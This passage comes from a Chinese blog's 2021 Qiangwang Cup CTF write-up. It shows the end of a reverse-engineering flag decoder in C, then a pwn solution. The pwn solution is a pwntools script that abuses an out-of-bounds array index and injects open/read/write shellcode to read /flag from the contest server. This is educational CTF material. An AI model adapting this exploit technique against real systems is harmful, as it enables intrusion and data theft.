class="number">0.0001112818534005219</span>,</span><br><span class="line">   <span class="number">0.0001046861985862495</span>,</span><br><span class="line">   <span class="number">0.0001112818534005219</span>,</span><br><span class="line">   <span class="number">0.000108992856167966</span>,</span><br><span class="line">   <span class="number">0.0001112636336217534</span>,</span><br><span class="line">   <span class="number">0.0001090234561758122</span>,</span><br><span class="line">   <span class="number">0.0001113183108652088</span>,</span><br><span class="line">   <span class="number">0.0001006882924839248</span>,</span><br><span class="line">   <span class="number">0.0001112590796092291</span>,</span><br><span class="line">   <span class="number">0.0001089841164633298</span>,</span><br><span class="line">   <span class="number">0.00008468431512187874</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">19</span>;i++)&#123;</span><br><span class="line">        <span class="type">double</span> k=flag[i];</span><br><span class="line">        <span class="type">int</span> num=e/k;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,num<span class="number">-1</span>,num&gt;&gt;<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="强网先锋-orw"><a href="#强网先锋-orw" class="headerlink" title="[强网先锋]orw"></a>[强网先锋]orw</h3><blockquote>
+<p>nc 39.105.131.68 12354</p>
+<p>附件（提取码：s97y）</p>
+</blockquote>
+<p>数组下标可控且可以为任意值,数组越界攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;39.105.131.68&#x27;</span>,<span class="number">12354</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="string">&#x27;-13&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:\n&quot;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">xor edi, edi</span></span><br><span class="line"><span class="string">push 8</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx </span></span><br><span class="line"><span class="string">xor esi, esi </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">push 2 </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">xor eax, eax </span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x30</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">push 1 </span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#read flag path</span></span><br><span class="line">p.sendline(<span class="string">&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mssnharvey.github.io">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mssnharvey.github.io/2021/06/12/2021qwb/">https://mssnharvey.github.io/2021/06/12/2021qwb/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mssnharvey.github.io" target="_blank">MssnHarvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/">强网杯</a></div><div class="post-share"><div class="social-share" data-image="/../imgs/qwb.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2021/09/09/2021fjgk/" title="2021年中国工业互联网安全大赛(福建省选拔赛) 暨首届福建省工业互联网创新大赛Writeup"><img class="cover" src="/../imgs/fjgk.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">2021年中国工业互联网安全大赛(福建省选拔赛) 暨首届福建省工业互联网创新大赛Writeup</div></div></div></a><a class="pagination-related  no-desc" href="/2021/05/09/hmb/" title="第四届红帽杯网络安全大赛Writeup"><img class="cover" src="/../imgs/hmb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">第四届红帽杯网络安全大赛Writeup</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Harvey</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/MssnHarvey/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:mssnharvey@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bro, you're under arrest.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BlueTeaming"><span class="toc-number">2.1.</span> <span class="toc-text">BlueTeaming</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzTime"><span class="toc-number">2.2.</span> <span class="toc-text">EzTime</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ISO1995"><span class="toc-number">2.3.</span> <span class="toc-text">ISO1995</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CipherMan"><span class="toc-number">2.4.</span> <span class="toc-text">CipherMan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-%E8%B5%8C%E5%BE%92"><span class="toc-number">3.1.</span> <span class="toc-text">[强网先锋]赌徒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-%E5%AF%BB%E5%AE%9D"><span class="toc-number">3.2.</span> <span class="toc-text">[强网先锋]寻宝</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmath"><span class="toc-number">4.1.</span> <span class="toc-text">ezmath</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">5.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-orw"><span class="toc-number">5.1.</span> <span class="toc-text">[强网先锋]orw</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/01/%E7%BA%A2%E9%98%9F%E5%A4%87%E5%BF%98%E5%BD%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" title="红队备忘录-信息收集篇"><img src="/../imgs/xxsj.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红队备忘录-信息收集篇"/></a><div class="content"><a class="title" href="/2026/02/01/%E7%BA%A2%E9%98%9F%E5%A4%87%E5%BF%98%E5%BD%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/" title="红队备忘录-信息收集篇">红队备忘录-信息收集篇</a><time datetime="2026-02-01T12:19:43.000Z" title="发表于 2026-02-01 20:19:43">2026-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/19/FineReport%20RCE202512/" title="帆软报表前台远程代码执行漏洞"><img src="/../imgs/FineReport2512.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="帆软报表前台远程代码执行漏洞"/></a><div class="content"><a class="title" href="/2026/01/19/FineReport%20RCE202512/" title="帆软报表前台远程代码执行漏洞">帆软报表前台远程代码执行漏洞</a><time datetime="2026-01-19T08:28:33.000Z" title="发表于 2026-01-19 16:28:33">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/16/vulntarget-n/" title="vulntarget-n"><img src="/../imgs/vulntarget-n.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulntarget-n"/></a><div class="content"><a class="title" href="/2024/11/16/vulntarget-n/" title="vulntarget-n">vulntarget-n</a><time datetime="2024-11-16T12:16:47.000Z" title="发表于 2024-11-16 20:16:47">2024-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/27/vulntarget-m/" title="vulntarget-m"><img src="/../imgs/vulntarget-m.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulntarget-m"/></a><div class="content"><a class="title" href="/2024/10/27/vulntarget-m/" title="vulntarget-m">vulntarget-m</a><time datetime="2024-10-27T14:03:25.000Z" title="发表于 2024-10-27 22:03:25">2024-10-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl"><img src="/../imgs/tomcatssl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tomcat实现国密ssl"/></a><div class="content"><a class="title" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl">tomcat实现国密ssl</a><time datetime="2024-03-14T07:28:33.000Z" title="发表于 2024-03-14 15:28:33">2024-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Harvey</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'MssnHarvey/Giscus',
+      'data-repo-id': 'R_kgDORNvvEQ',
+      'data-category-id': 'DIC_kwDORNvvEc4C2M_B',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !true) {
+    if (true) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
